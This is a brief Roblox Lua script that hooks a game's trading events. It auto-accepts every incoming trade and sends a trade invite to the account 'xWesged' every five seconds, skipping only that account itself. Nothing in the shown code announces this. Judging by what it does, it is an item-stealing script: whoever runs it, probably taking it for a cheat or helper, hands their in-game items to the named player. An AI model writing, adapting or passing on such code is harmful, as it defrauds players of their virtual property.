local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

if LocalPlayer.Name == "xWesged" then
    return
end

local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Trading = ReplicatedStorage:WaitForChild("Events"):WaitForChild("Trading")

-- Auto accept trades
Trading.AcceptTradeFromServer.OnClientEvent:Connect(function()
    Trading.AcceptTrade:InvokeServer()
end)

-- Send invite every 5 seconds
task.spawn(function()
    while true do
        Trading.SendInvite:InvokeServer("xWesged")
        task.wait(5)
    end
end)
